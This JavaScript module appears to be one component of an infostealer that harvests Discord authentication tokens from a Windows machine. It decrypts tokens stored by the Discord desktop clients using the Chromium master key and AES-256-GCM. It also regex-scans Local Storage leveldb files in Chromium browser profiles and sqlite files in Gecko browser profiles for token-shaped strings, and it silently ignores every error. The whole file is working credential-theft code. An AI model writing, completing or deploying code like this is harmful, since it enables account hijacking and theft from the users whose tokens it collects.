const path = require('path');
const fs = require('fs/promises');
const glob = require('glob');

const browsersPaths = require("./../browsers/paths.js");

const cryptofy = require("./../browsers/crypto.js");
const hardware = require("./../../utils/hardware/hardware.js");

const browsersProfiles = require("./../browsers/profiles.js");

const tokens = [];

const RegexpApps = /dQw4w9WgXcQ:[^"]*/g;
const RegexpBrowsers = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}/g;

const getTokens = async () => {
    const users = await hardware.getUsers();

    for (const user of users) {
        const discordPaths = browsersPaths.getDiscordPaths();
        for (const [name, discordPath] of Object.entries(discordPaths)) {
            const fullPath = path.join(user, 'AppData', 'Roaming', discordPath);

            try {

                if (!(await fs.access(fullPath).then(() => true).catch(() => false))) {
                    continue;
                }

                const stats = await fs.stat(fullPath);
                if (!stats.isDirectory()) {
                    continue;
                }

                const dir = path.dirname(fullPath);

                const { Chromium } = require("./../browsers/chromium.js");
                const chromium = new Chromium();
                
                const masterKey = chromium.GetMasterKey(dir);
                if (!masterKey) {
                    continue;
                }

                const leveldbFiles = glob.sync(path.join(dir, 'Local Storage', 'leveldb', '*.ldb'));
                const logFiles = glob.sync(path.join(dir, 'Local Storage', 'leveldb', '*.log'));
                const files = leveldbFiles.concat(logFiles);

                if (files.length === 0) {
                    continue;
                }

                for (const file of files) {
                    if (file.includes('cord')) {
                        const lines = (await fs.readFile(file, 'utf-8')).toString().split(/\r?\n/);

                        for (const line of lines) {
                            const matches = line.match(RegexpApps) || [];

                            if (matches) {
                                for (const match of matches) {

                                    const encodedPass = match.split("dQw4w9WgXcQ:")[1];
                                    const decodedPass = Buffer.from(encodedPass, 'base64');
                                    const token = cryptofy.decryptAES256GCM(masterKey, decodedPass);

                                    if (!tokens.some(t => t.token === token)) {
                                        tokens.push({
                                            browser: name,
                                            token: token
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (err) {
            }
        }

        const chromiumBrowsers = browsersPaths.getChromiumBrowsers();
        for (const [name, browserPath] of Object.entries(chromiumBrowsers)) {
            const fullPath = path.join(user, browserPath);

            try {

                if (!(await fs.access(fullPath).then(() => true).catch(() => false))) {
                    continue;
                }

                const stats = await fs.stat(fullPath);
                if (!stats.isDirectory()) {
                    continue;
                }

                const profilePaths = browsersProfiles.getChromiumProfiles(fullPath, name);

                if (profilePaths.length === 0) {
                    continue;
                }

                for (const profile of profilePaths) {

                    const profileStats = await fs.stat(profile.path);
                    if (!profileStats.isDirectory()) {
                        continue;
                    }

                    const leveldbFiles = glob.sync(path.join(profile.path, 'Local Storage', 'leveldb', '*.ldb'));
                    const logFiles = glob.sync(path.join(profile.path, 'Local Storage', 'leveldb', '*.log'));
                    const files = leveldbFiles.concat(logFiles);

                    for (const file of files) {
                        if (file.endsWith('.ldb') || file.endsWith('.log')) {
                            const lines = (await fs.readFile(file, 'utf-8')).toString().split(/\r?\n/);

                            for (const line of lines) {
                                const matches = line.match(RegexpBrowsers) || [];

                                if (matches) {
                                    for (const token of matches) {
                                        if (!tokens.some(t => t.token === token)) {
                                            tokens.push({
                                                browser: name,
                                                token: token
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (err) {
            }
        }

        const geckoBrowsers = browsersPaths.getGeckoBrowsers();
        for (const [name, browserPath] of Object.entries(geckoBrowsers)) {
            const fullPath = path.join(user, browserPath);

            try {

                if (!(await fs.access(fullPath).then(() => true).catch(() => false))) {
                    continue;
                }

                const stats = await fs.stat(fullPath);
                if (!stats.isDirectory()) {
                    continue;
                }

                const profilePaths = browsersProfiles.getGeckoProfiles(fullPath, name);

                if (profilePaths.length === 0) {
                    continue;
                }

                for (const profile of profilePaths) {

                    const profileStats = await fs.stat(profile.path);
                    if (!profileStats.isDirectory()) {
                        continue;
                    }

                    const files = await fs.readdir(profile.path);
                    if (files.length <= 10) {
                        continue;
                    }

                    const walkSQL = async (file) => {
                        if (file.endsWith('.sqlite')) {
                            const lines = (await fs.readFile(file, 'utf-8')).toString().split(/\r?\n/);

                            for (const line of lines) {
                                const matches = line.match(RegexpBrowsers) || [];

                                if (matches) {
                                    for (const token of matches) {
                                        if (!tokens.some(t => t.token === token)) {
                                            tokens.push({
                                                browser: name,
                                                token: token
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    };

                    const walkDir = async (dir) => {
                        const items = await fs.readdir(dir);

                        for (const item of items) {
                            const itemPath = path.join(dir, item);
                            const itemStats = await fs.stat(itemPath);

                            if (itemStats.isDirectory()) {
                                await walkDir(itemPath);
                            } else {
                                await walkSQL(itemPath)
                            }
                        }
                    };

                    await walkDir(profile.path);
                }
            } catch (err) {
            }
        }
    }
    return tokens;
}

module.exports = {
    getTokens
}